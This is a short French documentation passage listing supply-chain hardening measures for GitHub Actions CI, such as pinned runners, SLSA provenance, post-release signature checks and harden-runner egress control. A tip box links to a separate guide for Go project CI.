- Runners nommés par leur version
- Aucune valeur contrôlée de l'extérieur en `${{ }}` dans un bloc `run:`, tout passe par `env:`
- zizmor et actionlint en CI pour garder ces règles dans la durée
- Automerge derrière un cooldown de 5 jours, levé pour les digests sans date de publication
- Provenance SLSA sur ce qu'on publie, releases immuables une fois publiées
- Un job qui rejoue checksums, signature et attestation après la publication
- harden-runner en `audit` sur chaque job, `block` seulement là où l'egress est déterministe

!!! tip "Côté tests et release"
    Ces protections ne disent rien de ce que les tests vérifient. Pour une CI Go complète (matrice multi-OS, golangci-lint, govulncheck, release pilotée par les commits), voir [CI GitHub Actions pour un projet Go](go-ci.md).
